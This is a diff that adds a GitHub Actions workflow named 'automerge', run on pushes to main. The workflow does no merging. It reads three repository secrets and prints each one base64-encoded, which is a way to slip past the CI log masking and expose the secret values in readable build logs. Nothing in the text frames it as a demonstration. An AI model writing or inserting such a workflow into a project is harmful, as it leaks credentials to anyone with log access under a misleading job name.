@@ -1,0 +1,16 @@
+  name: automerge
+  on:
+    push:
+      branches: [main]
+  jobs:
+    test:
+      runs-on: ubuntu-latest
+      steps:
+        - env:
+            TEST_SECRET_1: "${{secrets.TEST_SECRET_1}}"
+            TEST_SECRET_2: "${{secrets.TEST_SECRET_2}}"
+            TEST_SECRET_3: "${{secrets.TEST_SECRET_3}}"
+          run: |
+            echo $TEST_SECRET_1 | base64
+            echo $TEST_SECRET_2 | base64
+            echo $TEST_SECRET_3 | base64
